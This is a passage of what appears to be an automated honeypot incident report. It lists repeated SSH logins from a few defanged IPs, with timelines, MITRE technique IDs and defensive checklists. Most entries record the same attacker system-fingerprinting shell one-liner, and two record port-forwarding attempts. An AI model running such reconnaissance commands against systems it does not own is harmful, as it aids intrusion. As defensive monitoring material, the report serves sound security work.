- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-91b8bd99d03e

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-24 19:11 |
| **Last Seen** | 2026-07-24 19:11 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 19:11:20` | `cowrie.session.connect` |
| `2026-07-24 19:11:21` | `cowrie.client.version` |
| `2026-07-24 19:11:21` | `cowrie.client.kex` |
| `2026-07-24 19:11:22` | `cowrie.login.success` |
| `2026-07-24 19:11:23` | `cowrie.session.params` |
| `2026-07-24 19:11:23` | `cowrie.command.input` |
| `2026-07-24 19:11:23` | `cowrie.command.input` |
| `2026-07-24 19:11:23` | `cowrie.command.input` |
| `2026-07-24 19:11:23` | `cowrie.command.input` |
| `2026-07-24 19:11:23` | `cowrie.command.input` |
| `2026-07-24 19:11:23` | `cowrie.command.success` |
| `2026-07-24 19:11:23` | `cowrie.command.input` |
| `2026-07-24 19:11:23` | `cowrie.command.input` |
| `2026-07-24 19:11:23` | `cowrie.command.input` |
| `2026-07-24 19:11:23` | `cowrie.command.input` |
| `2026-07-24 19:11:24` | `cowrie.log.closed` |
| `2026-07-24 19:11:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8c7bf2a9d647

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 19:12 |
| **Last Seen** | 2026-07-24 19:12 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 19:12:24` | `cowrie.session.connect` |
| `2026-07-24 19:12:25` | `cowrie.client.version` |
| `2026-07-24 19:12:25` | `cowrie.client.kex` |
| `2026-07-24 19:12:29` | `cowrie.login.success` |
| `2026-07-24 19:12:32` | `cowrie.session.params` |
| `2026-07-24 19:12:32` | `cowrie.command.input` |
| `2026-07-24 19:12:32` | `cowrie.command.input` |
| `2026-07-24 19:12:32` | `cowrie.command.input` |
| `2026-07-24 19:12:32` | `cowrie.command.input` |
| `2026-07-24 19:12:32` | `cowrie.command.input` |
| `2026-07-24 19:12:32` | `cowrie.command.success` |
| `2026-07-24 19:12:32` | `cowrie.command.input` |
| `2026-07-24 19:12:32` | `cowrie.command.input` |
| `2026-07-24 19:12:32` | `cowrie.command.input` |
| `2026-07-24 19:12:32` | `cowrie.command.input` |
| `2026-07-24 19:12:33` | `cowrie.log.closed` |
| `2026-07-24 19:12:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cb1d86251223

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-24 19:12 |
| **Last Seen** | 2026-07-24 19:13 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 19:12:57` | `cowrie.session.connect` |
| `2026-07-24 19:12:57` | `cowrie.client.version` |
| `2026-07-24 19:12:57` | `cowrie.client.kex` |
| `2026-07-24 19:12:58` | `cowrie.login.success` |
| `2026-07-24 19:12:59` | `cowrie.session.params` |
| `2026-07-24 19:12:59` | `cowrie.command.input` |
| `2026-07-24 19:12:59` | `cowrie.command.input` |
| `2026-07-24 19:12:59` | `cowrie.command.input` |
| `2026-07-24 19:12:59` | `cowrie.command.input` |
| `2026-07-24 19:12:59` | `cowrie.command.input` |
| `2026-07-24 19:12:59` | `cowrie.command.success` |
| `2026-07-24 19:12:59` | `cowrie.command.input` |
| `2026-07-24 19:12:59` | `cowrie.command.input` |
| `2026-07-24 19:12:59` | `cowrie.command.input` |
| `2026-07-24 19:12:59` | `cowrie.command.input` |
| `2026-07-24 19:13:00` | `cowrie.log.closed` |
| `2026-07-24 19:13:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ce9285a00353

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 19:13 |
| **Last Seen** | 2026-07-24 19:13 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 19:13:35` | `cowrie.session.connect` |
| `2026-07-24 19:13:36` | `cowrie.client.version` |
| `2026-07-24 19:13:36` | `cowrie.client.kex` |
| `2026-07-24 19:13:40` | `cowrie.login.success` |
| `2026-07-24 19:13:43` | `cowrie.session.params` |
| `2026-07-24 19:13:43` | `cowrie.command.input` |
| `2026-07-24 19:13:43` | `cowrie.command.input` |
| `2026-07-24 19:13:43` | `cowrie.command.input` |
| `2026-07-24 19:13:43` | `cowrie.command.input` |
| `2026-07-24 19:13:43` | `cowrie.command.input` |
| `2026-07-24 19:13:43` | `cowrie.command.success` |
| `2026-07-24 19:13:43` | `cowrie.command.input` |
| `2026-07-24 19:13:43` | `cowrie.command.input` |
| `2026-07-24 19:13:43` | `cowrie.command.input` |
| `2026-07-24 19:13:43` | `cowrie.command.input` |
| `2026-07-24 19:13:44` | `cowrie.log.closed` |
| `2026-07-24 19:13:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d8b2f6687271

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-24 19:14 |
| **Last Seen** | 2026-07-24 19:14 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 19:14:39` | `cowrie.session.connect` |
| `2026-07-24 19:14:39` | `cowrie.client.version` |
| `2026-07-24 19:14:39` | `cowrie.client.kex` |
| `2026-07-24 19:14:41` | `cowrie.login.success` |
| `2026-07-24 19:14:42` | `cowrie.session.params` |
| `2026-07-24 19:14:42` | `cowrie.command.input` |
| `2026-07-24 19:14:42` | `cowrie.command.input` |
| `2026-07-24 19:14:42` | `cowrie.command.input` |
| `2026-07-24 19:14:42` | `cowrie.command.input` |
| `2026-07-24 19:14:42` | `cowrie.command.input` |
| `2026-07-24 19:14:42` | `cowrie.command.success` |
| `2026-07-24 19:14:42` | `cowrie.command.input` |
| `2026-07-24 19:14:42` | `cowrie.command.input` |
| `2026-07-24 19:14:42` | `cowrie.command.input` |
| `2026-07-24 19:14:42` | `cowrie.command.input` |
| `2026-07-24 19:14:42` | `cowrie.log.closed` |
| `2026-07-24 19:14:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f155a69d176c

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 19:14 |
| **Last Seen** | 2026-07-24 19:14 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 19:14:44` | `cowrie.session.connect` |
| `2026-07-24 19:14:45` | `cowrie.client.version` |
| `2026-07-24 19:14:45` | `cowrie.client.kex` |
| `2026-07-24 19:14:48` | `cowrie.login.success` |
| `2026-07-24 19:14:50` | `cowrie.session.params` |
| `2026-07-24 19:14:50` | `cowrie.command.input` |
| `2026-07-24 19:14:50` | `cowrie.command.input` |
| `2026-07-24 19:14:50` | `cowrie.command.input` |
| `2026-07-24 19:14:50` | `cowrie.command.input` |
| `2026-07-24 19:14:50` | `cowrie.command.input` |
| `2026-07-24 19:14:50` | `cowrie.command.success` |
| `2026-07-24 19:14:50` | `cowrie.command.input` |
| `2026-07-24 19:14:50` | `cowrie.command.input` |
| `2026-07-24 19:14:50` | `cowrie.command.input` |
| `2026-07-24 19:14:50` | `cowrie.command.input` |
| `2026-07-24 19:14:51` | `cowrie.log.closed` |
| `2026-07-24 19:14:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8fd515c219b1

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 19:15 |
| **Last Seen** | 2026-07-24 19:16 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 19:15:51` | `cowrie.session.connect` |
| `2026-07-24 19:15:52` | `cowrie.client.version` |
| `2026-07-24 19:15:52` | `cowrie.client.kex` |
| `2026-07-24 19:15:56` | `cowrie.login.success` |
| `2026-07-24 19:15:58` | `cowrie.session.params` |
| `2026-07-24 19:15:58` | `cowrie.command.input` |
| `2026-07-24 19:15:58` | `cowrie.command.input` |
| `2026-07-24 19:15:58` | `cowrie.command.input` |
| `2026-07-24 19:15:58` | `cowrie.command.input` |
| `2026-07-24 19:15:58` | `cowrie.command.input` |
| `2026-07-24 19:15:58` | `cowrie.command.success` |
| `2026-07-24 19:15:58` | `cowrie.command.input` |
| `2026-07-24 19:15:58` | `cowrie.command.input` |
| `2026-07-24 19:15:58` | `cowrie.command.input` |
| `2026-07-24 19:15:58` | `cowrie.command.input` |
| `2026-07-24 19:15:59` | `cowrie.log.closed` |
| `2026-07-24 19:16:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-de0f72e398f4

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-24 19:16 |
| **Last Seen** | 2026-07-24 19:16 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 19:16:23` | `cowrie.session.connect` |
| `2026-07-24 19:16:23` | `cowrie.client.version` |
| `2026-07-24 19:16:23` | `cowrie.client.kex` |
| `2026-07-24 19:16:24` | `cowrie.login.success` |
| `2026-07-24 19:16:25` | `cowrie.session.params` |
| `2026-07-24 19:16:25` | `cowrie.command.input` |
| `2026-07-24 19:16:25` | `cowrie.command.input` |
| `2026-07-24 19:16:25` | `cowrie.command.input` |
| `2026-07-24 19:16:25` | `cowrie.command.input` |
| `2026-07-24 19:16:25` | `cowrie.command.input` |
| `2026-07-24 19:16:25` | `cowrie.command.success` |
| `2026-07-24 19:16:25` | `cowrie.command.input` |
| `2026-07-24 19:16:25` | `cowrie.command.input` |
| `2026-07-24 19:16:25` | `cowrie.command.input` |
| `2026-07-24 19:16:25` | `cowrie.command.input` |
| `2026-07-24 19:16:26` | `cowrie.log.closed` |
| `2026-07-24 19:16:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ca7687724b02

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 19:17 |
| **Last Seen** | 2026-07-24 19:17 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 19:17:00` | `cowrie.session.connect` |
| `2026-07-24 19:17:01` | `cowrie.client.version` |
| `2026-07-24 19:17:01` | `cowrie.client.kex` |
| `2026-07-24 19:17:05` | `cowrie.login.success` |
| `2026-07-24 19:17:08` | `cowrie.session.params` |
| `2026-07-24 19:17:08` | `cowrie.command.input` |
| `2026-07-24 19:17:08` | `cowrie.command.input` |
| `2026-07-24 19:17:08` | `cowrie.command.input` |
| `2026-07-24 19:17:08` | `cowrie.command.input` |
| `2026-07-24 19:17:08` | `cowrie.command.input` |
| `2026-07-24 19:17:08` | `cowrie.command.success` |
| `2026-07-24 19:17:08` | `cowrie.command.input` |
| `2026-07-24 19:17:08` | `cowrie.command.input` |
| `2026-07-24 19:17:08` | `cowrie.command.input` |
| `2026-07-24 19:17:08` | `cowrie.command.input` |
| `2026-07-24 19:17:09` | `cowrie.log.closed` |
| `2026-07-24 19:17:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8ac3e239f667

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-24 19:18 |
| **Last Seen** | 2026-07-24 19:18 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 19:18:10` | `cowrie.session.connect` |
| `2026-07-24 19:18:10` | `cowrie.client.version` |
| `2026-07-24 19:18:10` | `cowrie.client.kex` |
| `2026-07-24 19:18:11` | `cowrie.login.success` |
| `2026-07-24 19:18:12` | `cowrie.session.params` |
| `2026-07-24 19:18:12` | `cowrie.command.input` |
| `2026-07-24 19:18:12` | `cowrie.command.input` |
| `2026-07-24 19:18:12` | `cowrie.command.input` |
| `2026-07-24 19:18:12` | `cowrie.command.input` |
| `2026-07-24 19:18:12` | `cowrie.command.input` |
| `2026-07-24 19:18:12` | `cowrie.command.success` |
| `2026-07-24 19:18:12` | `cowrie.command.input` |
| `2026-07-24 19:18:12` | `cowrie.command.input` |
| `2026-07-24 19:18:12` | `cowrie.command.input` |
| `2026-07-24 19:18:12` | `cowrie.command.input` |
| `2026-07-24 19:18:13` | `cowrie.log.closed` |
| `2026-07-24 19:18:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c6c5732e5678

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 19:18 |
| **Last Seen** | 2026-07-24 19:18 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 19:18:12` | `cowrie.session.connect` |
| `2026-07-24 19:18:13` | `cowrie.client.version` |
| `2026-07-24 19:18:13` | `cowrie.client.kex` |
| `2026-07-24 19:18:16` | `cowrie.login.success` |
| `2026-07-24 19:18:19` | `cowrie.session.params` |
| `2026-07-24 19:18:19` | `cowrie.command.input` |
| `2026-07-24 19:18:19` | `cowrie.command.input` |
| `2026-07-24 19:18:19` | `cowrie.command.input` |
| `2026-07-24 19:18:19` | `cowrie.command.input` |
| `2026-07-24 19:18:19` | `cowrie.command.input` |
| `2026-07-24 19:18:19` | `cowrie.command.success` |
| `2026-07-24 19:18:19` | `cowrie.command.input` |
| `2026-07-24 19:18:19` | `cowrie.command.input` |
| `2026-07-24 19:18:19` | `cowrie.command.input` |
| `2026-07-24 19:18:19` | `cowrie.command.input` |
| `2026-07-24 19:18:20` | `cowrie.log.closed` |
| `2026-07-24 19:18:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e2f614fe47cd

| Field | Detail |
|---|---|
| **Source IP** | `200.222.71[.]218` |
| **First Seen** | 2026-07-24 19:18 |
| **Last Seen** | 2026-07-24 19:18 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 19:18:29` | `cowrie.session.connect` |
| `2026-07-24 19:18:29` | `cowrie.client.version` |
| `2026-07-24 19:18:29` | `cowrie.client.kex` |
| `2026-07-24 19:18:31` | `cowrie.login.success` |
| `2026-07-24 19:18:32` | `cowrie.direct-tcpip.request` |
| `2026-07-24 19:18:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `200.222.71[.]218` to AbuseIPDB if not already reported
- [ ] Block `200.222.71[.]218` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5499b017e8a2

| Field | Detail |
|---|---|
| **Source IP** | `182.139.39[.]150` |
| **First Seen** | 2026-07-24 19:18 |
| **Last Seen** | 2026-07-24 19:18 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 19:18:39` | `cowrie.session.connect` |
| `2026-07-24 19:18:40` | `cowrie.client.version` |
| `2026-07-24 19:18:40` | `cowrie.client.kex` |
| `2026-07-24 19:18:42` | `cowrie.login.success` |
| `2026-07-24 19:18:43` | `cowrie.direct-tcpip.request` |
| `2026-07-24 19:18:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.139.39[.]150` to AbuseIPDB if not already reported
- [ ] Block `182.139.39[.]150` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fb0573b07891

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 19:19 |
| **Last Seen** | 2026-07-24 19:19 |
| **Session Duration** | 9s |
